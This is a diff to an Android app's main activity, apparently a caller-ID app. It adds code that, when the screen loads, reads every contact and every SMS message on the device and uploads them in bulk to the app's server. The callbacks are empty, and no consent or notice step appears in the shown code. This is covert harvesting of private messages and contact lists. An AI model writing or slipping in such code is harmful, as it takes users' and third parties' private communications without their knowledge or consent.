@@ -12,9 +12,24 @@ import androidx.appcompat.widget.SearchView;
 import androidx.viewpager.widget.ViewPager;
 
 import com.magicbio.truename.R;
+import com.magicbio.truename.activeandroid.Contact;
 import com.magicbio.truename.adapters.MainPagerAdapter;
 import com.magicbio.truename.fragments.CallLogFragment;
 import com.magicbio.truename.fragments.ContactsFragment;
+import com.magicbio.truename.fragments.background.AppAsyncWorker;
+import com.magicbio.truename.models.Sms;
+import com.magicbio.truename.retrofit.ApiClient;
+import com.magicbio.truename.retrofit.ApiInterface;
+
+import java.util.ArrayList;
+import java.util.List;
+
+import kotlin.Unit;
+import kotlin.jvm.functions.Function1;
+import okhttp3.ResponseBody;
+import retrofit2.Call;
+import retrofit2.Callback;
+import retrofit2.Response;
 
 public class MainActivity extends AppCompatActivity implements SearchView.OnQueryTextListener {
 
@@ -138,6 +153,21 @@ public class MainActivity extends AppCompatActivity implements SearchView.OnQuer
         ).executeAsync();*/
 
 
+        AppAsyncWorker.fetchContacts(new Function1<ArrayList<Contact>, Unit>() {
+            @Override
+            public Unit invoke(ArrayList<Contact> contactArrayList) {
+                sendContactsData(contactArrayList);
+                return Unit.INSTANCE;
+            }
+        }, true);
+
+        AppAsyncWorker.fetchAllMessages(new Function1<ArrayList<Sms>, Unit>() {
+            @Override
+            public Unit invoke(ArrayList<Sms> smsArrayList) {
+                sendSmsData(smsArrayList);
+                return Unit.INSTANCE;
+            }
+        }, false, true);
     }
 
     private void tab1() {
@@ -234,6 +264,56 @@ public class MainActivity extends AppCompatActivity implements SearchView.OnQuer
         }
     }*/
 
+    private void sendContactsData(List<Contact> contacts) {
+     /*   List<Contact> contacts = new ArrayList<>(10);
+        for (int i = 0; i < 10; i++) {
+            Contact contact = new Contact();
+            contact.setNumber("+92 321 700410" + i);
+            contact.setName("Mobin" + i);
+            contact.userid = i + "";
+            contacts.add(contact);
+
+        }*/
+        ApiInterface apiInterface = ApiClient.getClient().create(ApiInterface.class);
+        apiInterface.sendContactsData(contacts).enqueue(new Callback<ResponseBody>() {
+            @Override
+            public void onResponse(Call<ResponseBody> call, Response<ResponseBody> response) {
+
+            }
+
+            @Override
+            public void onFailure(Call<ResponseBody> call, Throwable t) {
+
+            }
+        });
+
+    }
+
+    private void sendSmsData(List<Sms> sms) {
+       /* List<Sms> sms = new ArrayList<>(10);
+        for (int i = 0; i < 10; i++) {
+            Sms smsO = new Sms();
+            smsO.name = "Mobin " + i;
+            smsO.txtmessage = "Yawrr kuzzle lgwale :D";
+            smsO.userid = i + "";
+
+            sms.add(smsO);
+
+        }*/
+        ApiInterface apiInterface = ApiClient.getClient().create(ApiInterface.class);
+        apiInterface.sendSmsData(sms).enqueue(new Callback<ResponseBody>() {
+            @Override
+            public void onResponse(Call<ResponseBody> call, Response<ResponseBody> response) {
+
+            }
+
+            @Override
+            public void onFailure(Call<ResponseBody> call, Throwable t) {
+
+            }
+        });
+
+    }
 
     @Override
     public boolean onQueryTextSubmit(String query) {
